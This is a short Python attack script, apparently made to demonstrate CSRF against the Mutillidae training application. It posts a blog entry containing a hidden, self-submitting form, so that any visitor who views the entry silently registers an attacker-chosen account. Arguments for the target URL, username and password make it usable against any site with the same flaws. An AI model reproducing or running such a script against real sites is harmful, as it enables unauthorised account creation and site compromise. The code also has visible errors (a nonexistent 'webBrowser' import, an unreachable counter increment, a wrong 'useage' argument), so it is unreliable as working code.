#!/usr/bin/python
# coding:utf-8
# @author: pengfei filename:csrf.py

import webBrowser
from optparse import OptionParser

'''
   This code is used to show a csrf attack in Mutillidae, which can be exploited to add a new user.
'''


def GenerateInjectFrom(user,password,signature):
	'''
	Fill in the information for a new registered user.
	@parameter1 user(str): the user name you want to register.
	@parameter2 password(str): the password for the registered user.
	@parameter3 signature(str): signature for the registered user.
	'''
	template = '''
				<form id="my-form" action="index.php?page=register.php" 
						method="post" enctype="application/x-www-form-urlencoded">
						<input type="hidden" name="username" value="{0}" />
						<input type="hidden" name="password" value="{1}" />
						<input type="hidden" name="confirm_password" value="{1}" />
						<input type="hidden" name="my_Signature" value="{2}" />
						<input type="hidden" name="register-php-submit-button" value="Create Account" />
				</form>
				<script>document.getElementById("my-form").submit()</script>
			   '''
	blogData = 'Hi...' + template.format(user,password,signature)

	return blogData

def PostToblog(url,user,password,signature):
	'''
	Post the payload generated by GenerateInjectFrom function to the victim site.
	@parameter1	url(str): the victim site's url.
	@parameter2 user(str): the user name you want to register.
	@parameter3 password(str): the password for the registered user.
	@parameter4 signature(str): signature for the registered user.
	'''
	br = webBrowser()
	br.open(url)
	f_nr=0
	for form in br.forms():
		if str(form.attrs['id']) == 'idBlogForm':
			break
			f_nr += 1
	br.select_form(nr=f_nr)
	br.form['blog_entry'] = GenerateInjectFrom(user,password,signature)
	br.submit()
	br.close()

if __name__ == "__main__":

	useage = "Do a simple csrf attack"
	parser = OptionParser(useage=useage)
	parser.add_option('-u','--url',dest='url',help='the web url which you want to do the csrf attack')
	parser.add_option('-n','--newuser',dest='user',help='the new user you want to add')
	parser.add_option('-p','--password',dest='password',help='the password you want to add for user')
	parser.add_option('-s','--signature',dest='signature',help='the signature for the new user')

	(options,args) = parser.parse_args()

	PostToblog(options.url,options.user,options.password,options.signature)



